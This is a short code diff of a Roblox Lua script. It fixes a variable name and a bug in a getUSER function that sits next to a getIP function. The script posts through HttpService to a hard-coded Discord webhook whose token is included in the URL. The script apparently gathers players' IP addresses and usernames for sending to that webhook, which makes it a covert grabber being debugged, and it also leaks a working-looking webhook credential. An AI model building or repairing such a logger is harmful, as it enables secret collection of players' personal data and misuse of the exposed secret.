@@ -1,5 +1,5 @@
 local HttpService = game:GetService("HttpService")
-local Plyr = game:GetService("Players")
+local Player = game:GetService("Players")
 
 local URL = "https://discord.com/api/webhooks/1393398739812487189/D8MlZ7oGZ70VwMX045sIHBDmWUmBEvtBDDqJe97pJBfaSFZgQA2zRllrJKs-b8GOqXO9"
 
@@ -16,9 +16,9 @@ local function getIP()
 end
 
 local function getUSER()
-    local plr = Plyr.LocalPlayer
+    local plr = Player.LocalPlayer
     if plr then
-        return player.Name
+        return plr.Name
     else
         warn("Failed to get username.")
         return "Unknown"
